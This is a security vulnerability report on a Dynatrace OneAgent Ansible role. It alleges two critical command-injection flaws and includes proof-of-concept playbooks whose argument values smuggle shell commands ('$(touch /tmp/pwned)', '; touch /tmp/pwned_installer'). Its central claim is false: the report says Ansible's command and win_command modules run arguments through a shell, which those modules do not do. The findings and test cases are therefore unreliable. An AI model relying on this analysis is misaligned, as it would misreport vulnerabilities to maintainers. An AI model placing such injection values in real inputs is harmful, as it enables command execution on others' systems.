### Vulnerability List:

#### 1. Command Injection via `oneagentctl` Configuration

*   **Description:**
    1. The Ansible role uses `oneagentctl` command-line tool to configure the Dynatrace OneAgent after installation.
    2. The configuration parameters for `oneagentctl` are constructed from the `oneagent_install_args` and `oneagent_platform_install_args` Ansible variables.
    3. These variables are joined together and directly passed to the `oneagentctl` command within the `ansible.builtin.command` (for Unix) or `ansible.windows.win_command` (for Windows) modules.
    4. If an attacker can control or influence the values of `oneagent_install_args` or `oneagent_platform_install_args` (e.g., by providing malicious input to a playbook that uses this role), they can inject arbitrary commands into the `oneagentctl` execution.
    5. For example, an attacker could set `oneagent_install_args: ['--set-host-name=$(malicious command)']`. When the Ansible role executes `oneagentctl`, the injected command will be executed by the shell.

*   **Impact:**
    *   Successful command injection can allow an attacker to execute arbitrary commands on the target system with the privileges of the user running the Ansible agent.
    *   This can lead to full system compromise, data exfiltration, installation of malware, denial of service, or other malicious activities.

*   **Vulnerability Rank:** Critical

*   **Currently Implemented Mitigations:**
    *   No input sanitization or validation is implemented for `oneagent_install_args` and `oneagent_platform_install_args` variables before they are passed to `oneagentctl`.
    *   The code directly joins the provided arguments and executes them via shell command.

*   **Missing Mitigations:**
    *   **Input Sanitization:** Implement strict input sanitization and validation for all parameters passed to `oneagentctl`. This should include whitelisting allowed characters, escaping shell-sensitive characters, or using parameterized commands to prevent injection.
    *   **Avoid Shell Execution:** If possible, avoid direct shell execution and use more secure methods to interact with `oneagentctl` if available (though unlikely for command-line tools).
    *   **Principle of Least Privilege:** Ensure that the Ansible agent and `oneagentctl` are run with the minimum necessary privileges to limit the impact of a successful command injection.

*   **Preconditions:**
    *   An attacker needs to be able to influence the `oneagent_install_args` or `oneagent_platform_install_args` Ansible variables. This could be achieved if the playbook using this role takes user input and incorporates it into these variables without proper sanitization.
    *   The target system must have Dynatrace OneAgent installed or be in the process of installation via this Ansible role for the configuration part to be reached.

*   **Source Code Analysis:**
    1. **File:** `/code/roles/oneagent/tasks/config/config.yml`
        ```yaml
        - name: Combine configuration parameters
          ansible.builtin.set_fact:
            _oneagent_all_config_args: "{{ oneagent_passed_install_args | map('regex_search', '(--set-(.*))') | select('string') | list + ['--restart-service'] }}"
          no_log: true

        - name: Apply OneAgent configuration
          ansible.builtin.include_tasks: config-{{ oneagent_system_family }}.yml
        ```
        This task combines configuration parameters into `_oneagent_all_config_args`. It attempts to filter arguments starting with `--set-` but this is insufficient for security.

    2. **File:** `/code/roles/oneagent/tasks/config/config-unix.yml`
        ```yaml
        - name: Applying OneAgent configuration
          ansible.builtin.command: "{{ oneagent_ctl_bin_path }} {{ _oneagent_all_config_args | join(' ') }}"
          no_log: true
          ignore_errors: true
          changed_when: true
          register: _oneagent_config_result
          when: _oneagent_ctl_state.stat.exists
        ```
        On Unix systems, `ansible.builtin.command` executes `oneagentctl` with the concatenated arguments. The `join(' ')` directly combines all arguments with spaces, making it vulnerable to command injection if `_oneagent_all_config_args` contains malicious commands.

    3. **File:** `/code/roles/oneagent/tasks/config/config-windows.yml`
        ```yaml
        - name: Applying OneAgent configuration
          ansible.windows.win_command: "\"{{ oneagent_ctl_bin_path }}\" {{ _oneagent_all_config_args | join(' ') }}"
          no_log: true
          ignore_errors: true
          changed_when: true
          register: _oneagent_config_result
          when: _oneagent_ctl_state.stat.exists
        ```
        On Windows systems, `ansible.windows.win_command` similarly executes `oneagentctl` with concatenated arguments, also vulnerable to command injection.

    **Visualization:**

    ```
    [User Input (Malicious Install Args)] --> Ansible Playbook --> oneagent_install_args/oneagent_platform_install_args --> _oneagent_all_config_args --> Command Construction (join(' ')) --> `ansible.builtin.command` / `ansible.windows.win_command` --> Shell Execution (command injection) --> System Compromise
    ```

*   **Security Test Case:**
    1. **Precondition:** Ansible control node and a target machine (Linux or Windows) where OneAgent can be installed. Ansible collection `dynatrace.oneagent` is installed on the control node.
    2. **Create a malicious playbook (e.g., `exploit_config.yml`) on the Ansible control node:**
        ```yaml
        ---
        - name: "Exploit Command Injection in oneagentctl Configuration"
          hosts: all
          vars:
            oneagent_environment_url: "https://<your-dynatrace-environment-url>" # Replace with a valid URL if needed for role execution flow, or remove if not necessary to reach config section.
            oneagent_paas_token: "<your-paas-token>" # Replace with a valid token if needed, or remove if not necessary to reach config section.
            oneagent_install_args:
              - "--set-host-name=$(touch /tmp/pwned)" # Malicious command injection
          tasks:
            - name: Import Dynatrace OneAgent role
              ansible.builtin.import_role:
                name: dynatrace.oneagent.oneagent
        ```
        **Note:** Replace `<your-dynatrace-environment-url>` and `<your-paas-token>` with valid values if the role execution flow requires them to reach the configuration stage. If not needed, you can remove these variables if the role proceeds to configuration even without them (e.g., if an older agent is already installed).
    3. **Run the playbook against the target machine:**
        ```bash
        ansible-playbook exploit_config.yml -i <target_host>, -u <ansible_user> -k
        ```
        Replace `<target_host>` with the IP address or hostname of your target machine and `<ansible_user>` with a valid Ansible user.
    4. **Check for successful command injection on the target machine:**
        *   **For Linux:** Check if the file `/tmp/pwned` exists on the target machine.
            ```bash
            ssh <ansible_user>@<target_host> "ls /tmp/pwned"
            ```
            If the file `/tmp/pwned` exists, the command injection was successful.
        *   **For Windows:** You can adapt the injected command, for example, to create a file in the `C:\Temp` directory.  Then check for its existence using PowerShell or similar means.

#### 2. Command Injection via OneAgent Installer (Unix)

*   **Description:**
    1. On Unix-based systems (Linux, AIX), the Ansible role installs the OneAgent by executing a shell script installer.
    2. The `oneagent_install_cmd` variable is defined to invoke the installer script using `sh {{ oneagent_installer_path }}`.
    3. The `_oneagent_all_install_args` fact is constructed from `oneagent_install_args` and `oneagent_platform_install_args` and appended to the installer command.
    4. Similar to the `oneagentctl` configuration vulnerability, if `oneagent_install_args` or `oneagent_platform_install_args` is not properly sanitized, an attacker can inject arbitrary commands during the installer execution.
    5. For example, an attacker could try to inject commands via `oneagent_install_args` that will be appended to the `sh` command, potentially leading to command injection.

*   **Impact:**
    *   Successful command injection during the installer execution allows an attacker to execute arbitrary commands on the target system with the privileges used to run the installer (typically root or user with sudo privileges).
    *   This can lead to system compromise, privilege escalation (if installer runs with elevated privileges), and malicious modifications during the installation process.

*   **Vulnerability Rank:** Critical

*   **Currently Implemented Mitigations:**
    *   No input sanitization or validation is performed on `oneagent_install_args` and `oneagent_platform_install_args` before they are used in the installer command.
    *   The role directly concatenates and executes the installer command with user-controlled arguments via `ansible.builtin.command`.

*   **Missing Mitigations:**
    *   **Input Sanitization:** Implement robust input sanitization and validation for `oneagent_install_args` and `oneagent_platform_install_args` variables. Restrict allowed characters, escape shell metacharacters, or use safer methods to pass arguments to the installer if feasible.
    *   **Secure Installer Execution:** If possible, explore methods to execute the installer in a more controlled environment that limits shell interpretation of arguments. However, given it's a shell script installer, this might be challenging.
    *   **Principle of Least Privilege:** Run the Ansible agent and installer with the minimum necessary privileges. Although installers often require elevated privileges, ensure that these are strictly necessary and not overly broad.

*   **Preconditions:**
    *   An attacker must be able to influence the `oneagent_install_args` or `oneagent_platform_install_args` Ansible variables, similar to the `oneagentctl` configuration vulnerability.
    *   The target system must be a Unix-based system (Linux or AIX) and be in the process of OneAgent installation using this Ansible role.

*   **Source Code Analysis:**
    1. **File:** `/code/roles/oneagent/tasks/install/install.yml`
        ```yaml
        - name: Combine installation parameters
          ansible.builtin.set_fact:
            _oneagent_all_install_args: "{{ (oneagent_passed_install_args + oneagent_additional_reporting_params) | map('regex_replace', '(.*)', '\"\\1\"') | list }}"
          no_log: true

        - name: Install OneAgent
          ansible.builtin.include_tasks: install/install-{{ oneagent_system_family }}.yml
        ```
        This task combines installation parameters into `_oneagent_all_install_args`. It attempts to quote each argument with double quotes using `map('regex_replace', '(.*)', '\"\\1\"')`, which is insufficient to prevent command injection in all cases, especially when arguments themselves contain quotes or shell commands.

    2. **File:** `/code/roles/oneagent/tasks/install/install-unix.yml`
        ```yaml
        - name: Install OneAgent
          ansible.builtin.command: "{{ oneagent_install_cmd }} {{ _oneagent_all_install_args | join(' ') }}"
          no_log: true
          ignore_errors: true
          register: _oneagent_install_result
          changed_when: true
        ```
        On Unix systems, `ansible.builtin.command` executes the installer script defined by `oneagent_install_cmd` (which is `sh {{ oneagent_installer_path }}`) and appends the arguments from `_oneagent_all_install_args` joined by spaces. This direct shell execution and concatenation of arguments without proper sanitization creates a command injection vulnerability.

    **Visualization:**

    ```
    [User Input (Malicious Install Args)] --> Ansible Playbook --> oneagent_install_args/oneagent_platform_install_args --> _oneagent_all_install_args --> Command Construction (join(' ')) --> `ansible.builtin.command` (sh installer) --> Shell Execution (command injection) --> System Compromise
    ```

*   **Security Test Case:**
    1. **Precondition:** Ansible control node and a target Linux or AIX machine where OneAgent can be installed. Ansible collection `dynatrace.oneagent` is installed on the control node.
    2. **Create a malicious playbook (e.g., `exploit_install_unix.yml`) on the Ansible control node:**
        ```yaml
        ---
        - name: "Exploit Command Injection in OneAgent Installer (Unix)"
          hosts: all
          vars:
            oneagent_environment_url: "https://<your-dynatrace-environment-url>" # Replace with a valid URL if needed for role execution flow.
            oneagent_paas_token: "<your-paas-token>" # Replace with a valid token if needed for role execution flow.
            oneagent_install_args:
              - "INSTALL_PATH=/opt; touch /tmp/pwned_installer" # Malicious command injection via INSTALL_PATH and command chaining
          tasks:
            - name: Import Dynatrace OneAgent role
              ansible.builtin.import_role:
                name: dynatrace.oneagent.oneagent
        ```
        **Note:**  Replace `<your-dynatrace-environment-url>` and `<your-paas-token>` with valid values if the role execution flow requires them to reach the installation stage.
    3. **Run the playbook against the target Linux/AIX machine:**
        ```bash
        ansible-playbook exploit_install_unix.yml -i <target_host>, -u <ansible_user> -k --become
        ```
        Replace `<target_host>` with the IP address or hostname of your target machine and `<ansible_user>` with a valid Ansible user. The `--become` flag is needed as installation typically requires elevated privileges on Unix.
    4. **Check for successful command injection on the target machine:**
        *   **For Linux/AIX:** Check if the file `/tmp/pwned_installer` exists on the target machine.
            ```bash
            ssh <ansible_user>@<target_host> "ls /tmp/pwned_installer"
            ```
            If the file `/tmp/pwned_installer` exists, the command injection via the installer was successful.
